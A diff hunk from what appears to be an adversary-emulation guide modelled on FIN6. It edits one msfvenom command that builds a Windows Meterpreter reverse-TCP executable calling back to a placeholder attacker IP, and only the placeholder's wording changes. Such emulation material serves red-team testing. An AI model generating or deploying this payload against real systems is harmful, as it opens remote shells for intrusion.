@@ -45,7 +45,7 @@ To see what payloads are available from Framework, you can do:
 Below is the typical syntax to use msfvenom:
 
 ```bash
-./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
+./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -f exe -o /tmp/my_payload.exe
 ```
 
 ## Step 2 - FIN6 Discovery
